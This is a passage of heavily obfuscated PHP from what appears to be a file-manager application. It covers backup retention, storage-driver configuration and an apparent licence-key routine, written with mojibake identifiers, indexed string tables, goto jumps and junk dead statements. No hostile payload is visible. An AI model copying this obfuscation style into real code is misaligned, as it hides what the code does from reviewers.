$š“¶ §­ . $Óùáñ¸¤[6], $Óùáñ¸¤[136]); $†©ÑÑĞÜ = $ÏëˆåÅ¿[816]; $õéøê¿ = md5($Óùáñ¸¤[304] . ($Ü”üñËü + $š“¶ §­) . $Óùáñ¸¤[305] . $ÜÚŸõÉ† . $Óùáñ¸¤[305] . $†ñ½ßü . $Óùáñ¸¤[306]); $¤¤İ–ø = $this->wgdodc4d6c43($ÙŠƒ£ß, $õéøê¿) . $Óùáñ¸¤[307] . $æôãÅ™ğ; $×Ú Ã²Ä = $ÏëˆåÅ¿[817]; return $¤¤İ–ø; $ášåà› = $ÏëˆåÅ¿[818]; if (!$ášåà›) { return; } } public function fyqv110a469c($¹í™ÎıÄ) { $£æ¨ïâ‰ =& $_SERVER[ÕŸ²ó÷å]; $¾Î¾ÏŒ¯ =& $_SERVER[¢¿ãÄÁ¤]; $º¹Áõ°  = explode($¾Î¾ÏŒ¯[307], $¹í™ÎıÄ); if (count($º¹Áõ° ) != 2) { return $¾Î¾ÏŒ¯[6]; } $½—ù–˜ü = $this->lpurc88938a1($º¹Áõ° [1] . $¾Î¾ÏŒ¯[6], $¾Î¾ÏŒ¯[136]); if (!$½—ù–˜ü) { return $¾Î¾ÏŒ¯[6]; } $½—ù–˜ü = intval($½—ù–˜ü); $ñ¥´‹© = 0; $µè–Âµû = 0; $²ï×¦º = $£æ¨ïâ‰[819]; while ($²ï×¦º < $£æ¨ïâ‰[716]) { if ($²ï×¦º >= 0) { break; } $²ï×¦º++; } for ($¨ÆÌÎÄ¿ = 3; $¨ÆÌÎÄ¿ < $½—ù–˜ü; $¨ÆÌÎÄ¿ += 2) { if ($½—ù–˜ü % $¨ÆÌÎÄ¿ != 0) { continue; } $ñ¥´‹© = $¨ÆÌÎÄ¿; $µè–Âµû = intval($½—ù–˜ü / $¨ÆÌÎÄ¿); break; } $İÆ™–±È = ($ñ¥´‹© - 1) * ($µè–Âµû - 1); $Ââ§áå = $£æ¨ïâ‰[820]; if (!$Ââ§áå) { return; } $ÎŞ½Ø™È = intval(($ñ¥´‹© + $µè–Âµû) / 2); while (1) { $µı¢¡œ¦ = $ÎŞ½Ø™È; $Í‰—ÅÉ† = $£æ¨ïâ‰[821]; if (strlen($Í‰—ÅÉ†) < $£æ¨ïâ‰[693]) { die; } $âìÖòÉè = $İÆ™–±È; $÷„ú÷ = $£æ¨ïâ‰[822]; while ($âìÖòÉè % $µı¢¡œ¦ != 0) { $¨Ô“éÓ¡ = $âìÖòÉè; $âìÖòÉè = $µı¢¡œ¦; $óßş„şç = $£æ¨ïâ‰[823]; $µı¢¡œ¦ = $¨Ô“éÓ¡ % $µı¢¡œ¦; } if ($µı¢¡œ¦ == 1) { break; } else { $ÎŞ½Ø™È++; } } $÷ÇíŒéİ = 2; for ($¨ÆÌÎÄ¿ = 0; $¨ÆÌÎÄ¿ < $İÆ™–±È * 10; $¨ÆÌÎÄ¿++) { if (($İÆ™–±È * $¨ÆÌÎÄ¿ + 1) % $ÎŞ½Ø™È == 0) { $÷ÇíŒéİ = intval(($İÆ™–±È * $¨ÆÌÎÄ¿ + 1) / $ÎŞ½Ø™È); break; } } $Éİ­Ôİ = md5($¾Î¾ÏŒ¯[304] . ($ñ¥´‹© + $µè–Âµû) . $¾Î¾ÏŒ¯[305] . $ÎŞ½Ø™È . $¾Î¾ÏŒ¯[305] . $÷ÇíŒéİ . $¾Î¾ÏŒ¯[306]); $¥À†ï’ = $£æ¨ïâ‰[824]; $ä³½’îÁ = $this->lpurc88938a1($º¹Áõ° [0], $Éİ­Ôİ); $Ë˜çİâç = $£æ¨ïâ‰[825]; if (strlen($Ë˜çİâç) < $£æ¨ïâ‰[693]) { die; } return $ä³½’îÁ; } public function qhcfaebaed8c() { $Ë®ÏŞ¢¹ =& $_SERVER[ÕŸ²ó÷å]; $Ùå…“³© = mt_rand(pow(2, 14), pow(2, 16) - 1); $ƒ±ä  = $Ë®ÏŞ¢¹[826]; $×º²¯—¦ = array(); $Ä÷©¯”  = 1; $•¨ªÛç = $Ë®ÏŞ¢¹[827]; while ($•¨ªÛç < $Ë®ÏŞ¢¹[705]) { if ($•¨ªÛç >= 0) { break; } $•¨ªÛç++; } while ($Ä÷©¯”  <= (int) sqrt($Ùå…“³©)) { $„¥…üéë = $Ä÷©¯” ; $ïßæ¾‡® = $Ë®ÏŞ¢¹[828]; if (!$ïßæ¾‡®) { die; } while (!0) { $„¥…üéë++; if ($„¥…üéë <= 2) { $Ä÷©¯”  = $„¥…üéë; break; } else { if ($„¥…üéë < 2) { continue; } } $õÉÈ™å = !0; for ($±÷ø¡£Î = 2; $±÷ø¡£Î <= sqrt($„¥…üéë); $±÷ø¡£Î++) { if ($„¥…üéë % $±÷ø¡£Î == 0) { $õÉÈ™å = !1; } } if ($õÉÈ™å) { $Ä÷©¯”  = $„¥…üéë; break; } } $×º²¯—¦[] = $Ä÷©¯” ; } $Œ¨˜ĞÚ = 2; for ($„¥…üéë = $Ùå…“³©; $„¥…üéë > 1; $„¥…üéë--) { $õÉÈ™å = !0; $ğ˜¦É¿™ = $Ë®ÏŞ¢¹[829]; if (!$ğ˜¦É¿™) { return; } foreach ($×º²¯—¦ as $è´«™¡ª) { if ($„¥…üéë % $è´«™¡ª == 0) { $õÉÈ™å = !1; break; } } if ($õÉÈ™å) { $Œ¨˜ĞÚ = $„¥…üéë; break; } } return $Œ¨˜ĞÚ; } public function zkhv58c797ca($“Ş¤Û¹², $”™äÉÁó) { $±ëñ¶· =& $_SERVER[¢¿ãÄÁ¤]; return call_user_func(array($±ëñ¶·[8], $±ëñ¶·[308]), $“Ş¤Û¹², $”™äÉÁó); } public function wgdodc4d6c43($„Û‹¶¾µ, $àù§‹ë÷) { $’ù³”ÑÁ =& $_SERVER[¢¿ãÄÁ¤]; return call_user_func(array($’ù³”ÑÁ[309], $’ù³”ÑÁ[310]), $„Û‹¶¾µ, $àù§‹ë÷); $÷Òñ”¸– = $_SERVER[ÕŸ²ó÷å][830]; } public function lpurc88938a1($¸´ˆ®ü, $²ÙØÈÇş) { $Ï³÷«ğŠ =& $_SERVER[¢¿ãÄÁ¤]; return call_user_func(array($Ï³÷«ğŠ[309], $Ï³÷«ğŠ[311]), $¸´ˆ®ü, $²ÙØÈÇş); $¦ê÷°Èß = $_SERVER[ÕŸ²ó÷å][831]; if (!$¦ê÷°Èß) { die; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[ÕŸ²ó÷å][832]); $this->init(); $this->keep(); } public function init() { $ÛšÆĞ·» =& $_SERVER[ÕŸ²ó÷å]; $this->isManual(); self::$name = date($ÛšÆĞ·»[833]); if (!($ãÎ…âÜ = $this->model->lastItem())) { $ãÎ…âÜ = $this->initData(); } else { self::$name = $ãÎ…âÜ[$ÛšÆĞ·»[32]]; if ($ãÎ…âÜ[$ÛšÆĞ·»[834]] == $ÛšÆĞ·»[101]) { self::$name = date($ÛšÆĞ·»[281]); $—ê¹• Ï = intval(_get($ãÎ…âÜ, $ÛšÆĞ·»[835], 0)); if (self::$manual == 0 && $ãÎ…âÜ[$ÛšÆĞ·»[32]] == self::$name) { $this->model->remove($ãÎ…âÜ[$ÛšÆĞ·»[484]]); } $ãÎ…âÜ = $this->initData($—ê¹• Ï, $ãÎ…âÜ[$ÛšÆĞ·»[836]]); } else { $this->checkStore($ãÎ…âÜ[$ÛšÆĞ·»[836]]); } } self::$option = $ãÎ…âÜ; } private function isManual() { $İ–ÂÀâô = _get($GLOBALS, $_SERVER[ÕŸ²ó÷å][837], 0); $İ–ÂÀâô = intval($İ–ÂÀâô); self::$manual = $İ–ÂÀâô && $İ–ÂÀâô == 1 ? 1 : 0; } private function initData($™ÄÁ¶‚ı = 0, $ÒçñÔš = '') { $Ùô™Ş«ğ =& $_SERVER[ÕŸ²ó÷å]; $ê‘—®ÃÇ = $this->model->config(); if ($ÒçñÔš && $ê‘—®ÃÇ[$Ùô™Ş«ğ[836]] != $ÒçñÔš) { $™ÄÁ¶‚ı = 0; } $this->checkStore($ê‘—®ÃÇ[$Ùô™Ş«ğ[836]]); if (self::$manual == 1) { self::$name .= $Ùô™Ş«ğ[11] . date($Ùô™Ş«ğ[838]); } $äÑÉ‰Æ¯ = array($Ùô™Ş«ğ[836] => $ê‘—®ÃÇ[$Ùô™Ş«ğ[836]], $Ùô™Ş«ğ[32] => self::$name, $Ùô™Ş«ğ[834] => 0, $Ùô™Ş«ğ[181] => $ê‘—®ÃÇ[$Ùô™Ş«ğ[181]], $Ùô™Ş«ğ[839] => self::$manual, $Ùô™Ş«ğ[378] => array($Ùô™Ş«ğ[840] => array($Ùô™Ş«ğ[834] => 0), $Ùô™Ş«ğ[841] => array($Ùô™Ş«ğ[834] => 0, $Ùô™Ş«ğ[842] => 0, $Ùô™Ş«ğ[843] => 0, $Ùô™Ş«ğ[33] => $Ùô™Ş«ğ[12], $Ùô™Ş«ğ[844] => 0, $Ùô™Ş«ğ[845] => 0), $Ùô™Ş«ğ[846] => array($Ùô™Ş«ğ[834] => 0, $Ùô™Ş«ğ[842] => 0, $Ùô™Ş«ğ[843] => 0, $Ùô™Ş«ğ[844] => 0, $Ùô™Ş«ğ[845] => 0), $Ùô™Ş«ğ[240] => array($Ùô™Ş«ğ[834] => 0, $Ùô™Ş«ğ[847] => 0, $Ùô™Ş«ğ[848] => 0, $Ùô™Ş«ğ[849] => 0, $Ùô™Ş«ğ[850] => 0, $Ùô™Ş«ğ[550] => $™ÄÁ¶‚ı, $Ùô™Ş«ğ[844] => 0, $Ùô™Ş«ğ[845] => 0)), $Ùô™Ş«ğ[844] => time(), $Ùô™Ş«ğ[845] => 0); $ôĞ‚‹Ü = $this->model->insert($äÑÉ‰Æ¯); $äÑÉ‰Æ¯[$Ùô™Ş«ğ[484]] = $ôĞ‚‹Ü; return $äÑÉ‰Æ¯; } private function checkStore($·‚ö’å ) { $ç—ÃÌâ¦ = Model($_SERVER[ÕŸ²ó÷å][851]); $€”Ö£ò = $ç—ÃÌâ¦->listData($·‚ö’å ); $ç—ÃÌâ¦->checkConfig($€”Ö£ò); } public static function get() { if (!self::$option) { $¾ëßçôŞ = Model($_SERVER[ÕŸ²ó÷å][832]); $¡İ¥Û–ı = $¾ëßçôŞ->findByName(self::$name); $¾ëßçôŞ->parseContent($¡İ¥Û–ı); self::$option = $¡İ¥Û–ı; } return self::$option; } public static function set($Û«­òˆ³) { $‹¤—°À =& $_SERVER[ÕŸ²ó÷å]; $´÷ê´Éè = self::get(); foreach ($Û«­òˆ³ as $›ê¯ ‹‡ => $Ö´µ¡óµ) { array_set_value($´÷ê´Éè, $›ê¯ ‹‡, $Ö´µ¡óµ); } Model($‹¤—°À[832])->update($´÷ê´Éè[$‹¤—°À[484]], $´÷ê´Éè); self::$option = $´÷ê´Éè; return self::$option; } public function keep() { $‚Ø¥ãÃ¢ =& $_SERVER[ÕŸ²ó÷å]; $½›éï  = self::get(); if (_get($½›éï , $‚Ø¥ãÃ¢[852], 0) == $‚Ø¥ãÃ¢[101]) { return; } $this->backupKeep($½›éï ); self::set(array($‚Ø¥ãÃ¢[852] => 1)); } private function backupKeep($ Ââ˜¬£) { $­¬¬Î¸ß =& $_SERVER[ÕŸ²ó÷å]; if (self::$manual == 1) { return; } $³¾Ø½È³ = $this->model->listData(); if (empty($³¾Ø½È³)) { return; } $÷¾Ü›Ò¼ = 0; $¸Íûà†î = array(); foreach ($³¾Ø½È³ as $®îúŒäñ) { if ($÷¾Ü›Ò¼ >= 7) { break; } $¸Íûà†î[] = $®îúŒäñ[$­¬¬Î¸ß[32]]; $÷¾Ü›Ò¼++; } for ($÷¾Ü›Ò¼ = 0; $÷¾Ü›Ò¼ < 12; $÷¾Ü›Ò¼++) { $¸Íûà†î[] = date($­¬¬Î¸ß[853], strtotime("\x2d{$÷¾Ü›Ò¼}\x20\x6d\x6f\156\x74\x68\x73")); } $¸Íûà†î = array_unique($¸Íûà†î); $ø³ØÙÖ = Model($­¬¬Î¸ß[854])->get($­¬¬Î¸ß[855]); foreach ($³¾Ø½È³ as $®îúŒäñ) { if (isset($®îúŒäñ[$­¬¬Î¸ß[839]]) && $®îúŒäñ[$­¬¬Î¸ß[839]] == $­¬¬Î¸ß[101]) { continue; } if (!empty($®îúŒäñ[$­¬¬Î¸ß[32]]) && in_array($®îúŒäñ[$­¬¬Î¸ß[32]], $¸Íûà†î)) { continue; } $this->model->remove($®îúŒäñ[$­¬¬Î¸ß[484]]); $›¢á¼³ï = $this->backupPath($ Ââ˜¬£, $ø³ØÙÖ); IO::remove($›¢á¼³ï, !1); } } private function backupPath($²Ãİß±ˆ, $™§îÆéë = false) { $ôáœ¢á =& $_SERVER[ÕŸ²ó÷å]; if (!$™§îÆéë) { $™§îÆéë = Model($ôáœ¢á[854])->get($ôáœ¢á[855]); } $ƒ¬›¨‰ = $²Ãİß±ˆ[$ôáœ¢á[32]]; $“¶’İ¦õ = substr(md5($ôáœ¢á[856] . $™§îÆéë . $ƒ¬›¨‰), 0, 8); return "\x7b\x69\x6f\x3a{$²Ãİß±ˆ[$ôáœ¢á[836]]}\x7d\57\x64\x61\x74\141\142\x61\163\x65\57\x62\x61\x63\x6b\x75\160\x2f" . $ƒ¬›¨‰ . $ôáœ¢á[11] . $“¶’İ¦õ; } public function db() { $²¡ç­ûÒ =& $_SERVER[ÕŸ²ó÷å]; $Õã“è¥Ü = self::get(); if (_get($Õã“è¥Ü, $²¡ç­ûÒ[857], 0) == $²¡ç­ûÒ[101]) { return !0; } $ßşëÈüî = new BackupDb(); if (!$ßşëÈüî->index()) { return !1; } self::set(array($²¡ç­ûÒ[857] => 1)); return !0; } public function dbFile() { $À°¡ÌÉÂ =& $_SERVER[ÕŸ²ó÷å]; $Øšì¨‡» = self::get(); if (_get($Øšì¨‡», $À°¡ÌÉÂ[858], 0) == $À°¡ÌÉÂ[101]) { return !0; } $¹ß„È• = new BackupDbFile(); if (!$¹ß„È•->index()) { return !1; } self::set(array($À°¡ÌÉÂ[858] => 1)); return !0; } public function file() { $¯³é°õ÷ =& $_SERVER[ÕŸ²ó÷å]; $ıÊÒ°˜© = self::get(); if (_get($ıÊÒ°˜©, $¯³é°õ÷[859], 0) == $¯³é°õ÷[101]) { return !0; } if ($ıÊÒ°˜©[$¯³é°õ÷[181]] == $¯³é°õ÷[860]) { $¸¿²ç‰× = new BackupFile(); if (!$¸¿²ç‰×->index()) { return !1; } } self::set(array($¯³é°õ÷[859] => 1, $¯³é°õ÷[834] => 1)); return !0; } } goto E¾ŸÎ±¯ê¤; AÒËˆ»ÑíÇ: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\163\164\157\x72\x61\147\145\114\x69\163\x74"; public $field = array("\x6e\141\x6d\x65", "\163\x69\172\145\115\x61\x78", "\163\171\x73\x74\145\155", "\144\x65\x66\141\x75\154\164", "\144\162\x69\x76\x65\162", "\x63\x6f\156\x66\x69\x67"); public function listData($ŠÔ„ùÅÆ = false, $àçğÉïê = "\x6d\157\x64\151\x66\x79\124\x69\155\x65", $ÜÏİñÃ· = false) { $«Èå²ÎŞ =& $_SERVER[ÕŸ²ó÷å]; $ò» à´® = parent::listData($ŠÔ„ùÅÆ, $àçğÉïê, $ÜÏİñÃ·); if ($ŠÔ„ùÅÆ) { return $ò» à´®; } $‹Ó²Éèø = array(); if ($GLOBALS[$«Èå²ÎŞ[2303]]) { $‹Ó²Éèø = $this->ioSizeUseGet(array_to_keyvalue($ò» à´®, $«Èå²ÎŞ[12], $«Èå²ÎŞ[484])); } foreach ($ò» à´® as $Çó¡Æô™ => $™ö¨Œúº) { unset($ò» à´®[$Çó¡Æô™][$«Èå²ÎŞ[6]]); $ò» à´®[$Çó¡Æô™][$«Èå²ÎŞ[1960]] = isset($‹Ó²Éèø[$™ö¨Œúº[$«Èå²ÎŞ[484]]]) ? $‹Ó²Éèø[$™ö¨Œúº[$«Èå²ÎŞ[484]]] : 0; } return $ò» à´®; } public function ioSizeUseGet($ø¬É†‹) { $èâå“é =& $_SERVER[ÕŸ²ó÷å]; if (!$ø¬É†‹) { return array(); } $¤©æúË = $èâå“é[2304] . implode($èâå“é[50], $ø¬É†‹); $¡ğ¥Ååã = Cache::get($¤©æúË); if ($¡ğ¥Ååã) { return $¡ğ¥Ååã; } $¤Šú”à„ = array($èâå“é[901] => $èâå“é[484], $èâå“é[2305] => $èâå“é[89]); $ŠÏ÷÷î = array($èâå“é[901] => array($èâå“é[7], $ø¬É†‹)); $¡ğ¥Ååã = Model($èâå“é[873])->field($¤Šú”à„)->where($ŠÏ÷÷î)->group($èâå“é[901])->select(); $¡ğ¥Ååã = array_to_keyvalue($¡ğ¥Ååã, $èâå“é[484], $èâå“é[89]); Cache::set($¤©æúË, $¡ğ¥Ååã, 600); return $¡ğ¥Ååã; } public function getConfig($Îíñºâ¾) { $åıß—× = parent::listData($Îíñºâ¾); return json_decode($åıß—×[$_SERVER[ÕŸ²ó÷å][6]], !0); } public function update($—ô²Ñ³Û, $¶´±”¾³) { $üàü²Û =& $_SERVER[ÕŸ²ó÷å]; $×²Ğ’Â = $¶´±”¾³[$üàü²Û[32]]; $ëÚáçú = array_to_keyvalue(parent::listData(), $üàü²Û[32]); if (isset($ëÚáçú[$×²Ğ’Â]) && $ëÚáçú[$×²Ğ’Â][$üàü²Û[484]] != $—ô²Ñ³Û) { return !1; } $this->checkPwd($—ô²Ñ³Û, $¶´±”¾³); if (isset($¶´±”¾³[$üàü²Û[2306]]) && $¶´±”¾³[$üàü²Û[2306]] == $üàü²Û[101]) { $this->checkConfig($¶´±”¾³); } unset($¶´±”¾³[$üàü²Û[2306]]); $®Ğšª¿ù = parent::update($—ô²Ñ³Û, $¶´±”¾³); if ($®Ğšª¿ù && $¶´±”¾³[$üàü²Û[37]]) { $Åìº  = 0; foreach ($ëÚáçú as $ø¨Ï©ÚÛ) { if ($ø¨Ï©ÚÛ[$üàü²Û[37]] && $ø¨Ï©ÚÛ[$üàü²Û[484]] != $—ô²Ñ³Û) { $Åìº  = $ø¨Ï©ÚÛ[$üàü²Û[484]]; parent::update($ø¨Ï©ÚÛ[$üàü²Û[484]], array($üàü²Û[37] => 0)); } } $this->updateBackup($—ô²Ñ³Û, $Åìº ); } return $®Ğšª¿ù; } public function add($¬¡•üï) { $ø£’¯´Ü =& $_SERVER[ÕŸ²ó÷å]; $À¸Èçú = array_to_keyvalue(parent::listData(), $ø£’¯´Ü[32]); if (isset($À¸Èçú[$¬¡•üï[$ø£’¯´Ü[32]]])) { return !1; } $this->checkConfig($¬¡•üï); $ú¾ñó¶Æ = parent::insert($¬¡•üï); if ($ú¾ñó¶Æ && $¬¡•üï[$ø£’¯´Ü[37]]) { foreach ($À¸Èçú as $¦Ìš§—) { if ($¦Ìš§—[$ø£’¯´Ü[37]]) { parent::update($¦Ìš§—[$ø£’¯´Ü[484]], array($ø£’¯´Ü[37] => 0)); } } } return $ú¾ñó¶Æ; } public function updateBackup($öËŸ, $–µå‘ÃÀ) { $²é…Ÿñ« =& $_SERVER[ÕŸ²ó÷å]; if (!$–µå‘ÃÀ) { return; } $ïë©Óª = Model($²é…Ÿñ«[832])->config(); if ($ïë©Óª[$²é…Ÿñ«[1743]] != $²é…Ÿñ«[101] || $ïë©Óª[$²é…Ÿñ«[836]] != $–µå‘ÃÀ) { return; } $ÉÆ§Æ²€ = Model($²é…Ÿñ«[854])->get($²é…Ÿñ«[867]); $ÉÆ§Æ²€ = json_decode($ÉÆ§Æ²€, !0); if (!$ÉÆ§Æ²€) { return; } $ÉÆ§Æ²€[$²é…Ÿñ«[836]] = $öËŸ; Model($²é…Ÿñ«[854])->set(array($²é…Ÿñ«[867] => $ÉÆ§Æ²€)); } public function checkPwd($ÂÊğÖŒ, &$êâå¿Œ) { $®¦ı†×ñ =& $_SERVER[ÕŸ²ó÷å]; if (empty($êâå¿Œ[$®¦ı†×ñ[6]])) { return; } $®´õƒ²· = json_decode($êâå¿Œ[$®¦ı†×ñ[6]], !0); $òĞûãŒ = $®¦ı†×ñ[12]; $”ıÄÊŠ© = array($®¦ı†×ñ[2307], $®¦ı†×ñ[2308], $®¦ı†×ñ[970]); foreach ($”ıÄÊŠ© as $òÎÀóİ) { if (isset($®´õƒ²·[$òÎÀóİ])) { $òĞûãŒ = $òÎÀóİ; break; } } if (!$òĞûãŒ) { return; } $È´Óëàº = $this->getConfig($ÂÊğÖŒ); $œéë¬©š = $È´Óëàº[$òĞûãŒ]; $Ú‘ŸÌ»µ = $®´õƒ²·[$òĞûãŒ]; if ($Ú‘ŸÌ»µ == str_repeat($®¦ı†×ñ[230], strlen($œéë¬©š))) { $®´õƒ²·[$òĞûãŒ] = $œéë¬©š; $êâå¿Œ[$®¦ı†×ñ[6]] = json_encode($®´õƒ²·); } else { if ($Ú‘ŸÌ»µ != $œéë¬©š) { $êâå¿Œ[$®¦ı†×ñ[2306]] = $®¦ı†×ñ[101]; } } } public function checkConfig(&$ÓúèÍë, $¦ŞÊåñŒ = false) { $Ç‘—°˜ =& $_SERVER[ÕŸ²ó÷å]; $«ûÍÆõÁ = strtolower($ÓúèÍë[$Ç‘—°˜[108]]); $Ü°ÓÓüÂ = $ÓúèÍë[$Ç‘—°˜[6]]; if (!is_array($Ü°ÓÓüÂ)) { $Ü°ÓÓüÂ = json_decode($Ü°ÓÓüÂ, !0); } foreach ($Ü°ÓÓüÂ as $ˆ´Ü€ => $‘ì—´‘) { if (is_string($‘ì—´‘)) { $Ü°ÓÓüÂ[$ˆ´Ü€] = trim($‘ì—´‘); } } $Ü°ÓÓüÂ[$Ç‘—°˜[2309]] = rand_string(6); $ŸÑ›¼á¹ = $GLOBALS[$Ç‘—°˜[6]][$Ç‘—°˜[102]][$Ç‘—°˜[909]]; $éÉ¡Ûë = isset($ŸÑ›¼á¹[$«ûÍÆõÁ]) ? $ŸÑ›¼á¹[$«ûÍÆõÁ] : ucfirst($«ûÍÆõÁ); $à÷÷şš = $Ç‘—°˜[87] . $éÉ¡Ûë; if (!$éÉ¡Ûë || !class_exists($à÷÷şš)) { if ($¦ŞÊåñŒ) { return LNG($Ç‘—°˜[2310]); } write_log(array($Ç‘—°˜[2311], $ÓúèÍë, get_caller_info()), $Ç‘—°˜[225]); show_json(LNG($Ç‘—°˜[2310]), !1, $ÓúèÍë); } $Òßñ€Å‰ = new $à÷÷şš($Ü°ÓÓüÂ); if (in_array($«ûÍÆõÁ, $Òßñ€Å‰->objectDriver)) { try { if (!$Òßñ€Å‰->isBucketCors() && !$Òßñ€Å‰->setBucketCors()) { $ğ…†¯Šõ = LNG($Ç‘—°˜[2312]); $ğ…†¯Šõ .= $Ç‘—°˜[2313] . LNG($Ç‘—°˜[2314]); } } catch (Exception $ˆİÍ¤Í) { $ğ…†¯Šõ = $ˆİÍ¤Í->getMessage(); } if (isset($ğ…†¯Šõ)) { return $this->_parseError($ğ…†¯Šõ, $«ûÍÆõÁ, $¦ŞÊåñŒ); } if ($«ûÍÆõÁ == $Ç‘—°˜[78] && !$Òßñ€Å‰->checkRegion()) { return $this->_parseError(LNG($Ç‘—°˜[2315]), $«ûÍÆõÁ, $¦ŞÊåñŒ); } } $…¸Ã»¿Ç = rtrim($Ü°ÓÓüÂ[$Ç‘—°˜[1265]], $Ç‘—°˜[8]) . $Ç‘—°˜[8]; $È¬Èù = $Òßñ€Å‰->getPath($…¸Ã»¿Ç . $Ç‘—°˜[1269]); try { if ($«ûÍÆõÁ == $Ç‘—°˜[119]) { $Òßñ€Å‰->mkdir($…¸Ã»¿Ç); } $¦‡•ƒŸ­ = $Òßñ€Å‰->mkfile($È¬Èù); if (!$¦‡•ƒŸ­) { $ğ…†¯Šõ = LNG($Ç‘—°˜[2312]); } } catch (Exception $ˆİÍ¤Í) { $ğ…†¯Šõ = $ˆİÍ¤Í->getMessage(); } if (isset($ğ…†¯Šõ)) { return $this->_parseError($ğ…†¯Šõ, $«ûÍÆõÁ, $¦ŞÊåñŒ); } $Ü°ÓÓüÂ[$Ç‘—°˜[1265]] = $…¸Ã»¿Ç; $ÓúèÍë[$Ç‘—°˜[6]] = json_encode($Ü°ÓÓüÂ); $ÓúèÍë[$Ç‘—°˜[108]] = $éÉ¡Ûë; return !0; } private function _parseError($û§§âçÅ, $¸Ÿç‚¼º, $Üåºİ÷Ç = false) { $ğì®šÓ =& $_SERVER[ÕŸ²ó÷å]; if ($¸Ÿç‚¼º == $ğì®šÓ[78] && stripos($û§§âçÅ, $ğì®šÓ[2316])) { $½‰“è¿á = explode($ğì®šÓ[10], $û§§âçÅ); $Å§°ıÄ¨ = isset($½‰“è¿á[1]) ? $½‰“è¿á[1] : $ğì®šÓ[12]; $•Ø°‡ = array($ğì®šÓ[2317] => LNG($ğì®šÓ[2318]), $ğì®šÓ[2319] => LNG($ğì®šÓ[2320])); if (isset($•Ø°‡[$Å§°ıÄ¨])) { $û§§âçÅ = $•Ø°‡[$Å§°ıÄ¨]; } } if (stripos($û§§âçÅ, $ğì®šÓ[2321]) === 0) { $–äëÓÅü = strpos($û§§âçÅ, $ğì®šÓ[188]); if ($–äëÓÅü === !1) { $–äëÓÅü = strpos($û§§âçÅ, $ğì®šÓ[4]); } if ($–äëÓÅü !== !1) { $û§§âçÅ = substr($û§§âçÅ, $–äëÓÅü + 1); } } $û§§âçÅ = LNG($ğì®šÓ[1272]) . $û§§âçÅ; if ($Üåºİ÷Ç) { return $û§§âçÅ; } show_json($û§§âçÅ, !1); } public function driverListSystem() { $Á¿Şú´Ó =& $_SERVER[ÕŸ²ó÷å]; $àÒÆÏ© = parent::listData(); $È¸ùÆëŠ = array(); foreach ($àÒÆÏ© as $îÉŠêàè) { unset($îÉŠêàè[$Á¿Şú´Ó[241]], $îÉŠêàè[$Á¿Şú´Ó[98]]); $îÉŠêàè[$Á¿Şú´Ó[6]] = json_decode($îÉŠêàè[$Á¿Şú´Ó[6]], !0); $È¸ùÆëŠ[] = $îÉŠêàè; } return $È¸ùÆëŠ; } public function defaultDriver() { $²âî =& $_SERVER[ÕŸ²ó÷å]; $îƒÔšë· = parent::listData(); $Î‘ÓƒÉ« = array_filter_by_field($îƒÔšë·, $²âî[37], 1); $Î‘ÓƒÉ« = $Î‘ÓƒÉ«[0]; if ($Î‘ÓƒÉ«) { $Î‘ÓƒÉ«[$²âî[6]] = json_decode($Î‘ÓƒÉ«[$²âî[6]], !0); } return $Î‘ÓƒÉ«; } public function driverInfo($Ğñü±²ó) { $ª¶ªï =& $_SERVER[ÕŸ²ó÷å]; $ç±ã¢ˆÆ = array_to_keyvalue(parent::listData(), $ª¶ªï[484]); if (!isset($ç±ã¢ˆÆ[$Ğñü±²ó])) { return !1; } $¹şŒÏÊ = $ç±ã¢ˆÆ[$Ğñü±²ó]; $¹şŒÏÊ[$ª¶ªï[6]] = json_decode($¹şŒÏÊ[$ª¶ªï[6]], !0); return $¹şŒÏÊ; } public function remove($îÎÂ˜Ô‡) { $this->removeShareItems($îÎÂ˜Ô‡); return parent::remove($îÎÂ˜Ô‡); } public function removeWithFile($±—£±Ä, $¸ç İ»í, $Äğúßáì, $ßàõËĞ = false) { $ÜÍ±Ô¬Ò =& $_SERVER[ÕŸ²ó÷å]; $Ï÷ˆ¢ØÒ = array($ÜÍ±Ô¬Ò[901] => $±—£±Ä); $›â§±­¦ = Model($ÜÍ±Ô¬Ò[553])->where($Ï÷ˆ¢ØÒ)->count(); $Ø†Óç÷¤ = Model($ÜÍ±Ô¬Ò[553])->where($Ï÷ˆ¢ØÒ)->sum($ÜÍ±Ô¬Ò[89]); $‚ÃØİâó = $¸ç İ»í . $ÜÍ±Ô¬Ò[2322] . $±—£±Ä; $¼õ íşğ = LNG($¸ç İ»í == $ÜÍ±Ô¬Ò[629] ? $ÜÍ±Ô¬Ò[2323] : $ÜÍ±Ô¬Ò[2324]); $àéÄÌÚé = new TaskFileTransfer($‚ÃØİâó, $ÜÍ±Ô¬Ò[225], $›â§±­¦, $¼õ íşğ . $ÜÍ±Ô¬Ò[471] . $Äğúßáì[$ÜÍ±Ô¬Ò[32]] . $ÜÍ±Ô¬Ò[224] . $±—£±Ä); $àéÄÌÚé->task[$ÜÍ±Ô¬Ò[847]] = (double) $Ø†Óç÷¤; $°õ½ûâĞ = KodIO::defaultDriver(); $²‰ƒï½ª = $°õ½ûâĞ[$ÜÍ±Ô¬Ò[484]]; $­œãŒËÖ = $¿µĞº = $ùô×Õ‡œ = array(); $®é³¸¼ = Model($ÜÍ±Ô¬Ò[240])->where($Ï÷ˆ¢ØÒ)->field($ÜÍ±Ô¬Ò[2325])->select(); foreach ($®é³¸¼ as $ñ¾ê³‡É) { $åÅî³Î‹ = $ñ¾ê³‡É[$ÜÍ±Ô¬Ò[550]]; if ($ßàõËĞ) { $¿µĞº[] = $åÅî³Î‹; continue; } $Ø—®ç‰¢ = $ñ¾ê³‡É[$ÜÍ±Ô¬Ò[97]]; $øßÕäêû = get_path_father($Ø—®ç‰¢); $ùô×Õ‡œ[] = $øßÕäêû; $øßÕäêû = str_replace("\173\151\x6f\72{$±—£±Ä}\175\x2f", "\x7b\151\x6f\72{$²‰ƒï½ª}\175\57", $øßÕäêû); if (!IO::exist($Ø—®ç‰¢)) { $­œãŒËÖ[] = $åÅî³Î‹; $àéÄÌÚé->updateFileEnd($ñ¾ê³‡É[$ÜÍ±Ô¬Ò[32]], $ñ¾ê³‡É[$ÜÍ±Ô¬Ò[89]]); write_log($ÜÍ±Ô¬Ò[2326] . $Ø—®ç‰¢, $ÜÍ±Ô¬Ò[1903]); continue; } $´Àñ¥©” = IO::move($Ø—®ç‰¢, $øßÕäêû, REPEAT_RENAME); if (!$´Àñ¥©”) { 